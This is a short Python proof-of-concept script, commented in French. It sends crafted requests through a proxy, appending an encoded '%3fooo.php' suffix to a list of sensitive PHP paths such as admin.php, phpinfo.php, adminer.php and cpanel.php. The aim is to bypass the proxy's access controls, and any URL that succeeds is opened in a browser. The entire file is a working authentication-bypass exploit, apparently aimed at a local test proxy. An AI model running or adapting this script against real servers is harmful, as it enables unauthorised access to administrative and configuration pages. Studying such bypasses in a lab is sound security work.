import requests
import webbrowser
import sys
import os
from selenium import webdriver
import time
from selenium.webdriver.firefox.service import Service

os.environ["DBUS_SESSION_BUS_ADDRESS"] = "/dev/null"

# Liste des fichiers PHP suspects
fichiers_php = [
    "admin.php",
    "php-info.php",
    "php_info.php",
    "phpinfo.php",
    "info.php",
    "adminer.php",
    "xmlrpc.php",
    "bin/cron.php",
    "cache/index.tpl.php",
    "cpanel.php"
]



def send_malicious_request():
    try:
        proxy_url = "http://localhost:8787"  

        for fichier in fichiers_php:
            # Construction des chemins
            backend_service_path = f"/{fichier}"
            malicious_path = f"/{fichier}%3fooo.php"

            # URL malveillante à tester
            malicious_url = f"{proxy_url}{malicious_path}"

            # Envoi de la requête malveillante via le proxy
            response = requests.get(malicious_url)

            # Affichage du statut de la requête
            print("Status Code:", response.status_code)
            print("Fichier:", fichier)

            # Si la requête réussit (code 200), ouverture dans le navigateur
            if response.status_code == 200:
                webbrowser.open(f"{proxy_url}/{fichier}")
                webbrowser.open(malicious_url)
                time.sleep(5)
            else:
                print("[-] Failed to bypass authentication.")

    except Exception as e:
        print("[-] An error occurred:", str(e))

if __name__ == "__main__":
    send_malicious_request()
    sys.exit()
    # raise SystemExit
    # os._exit(0)
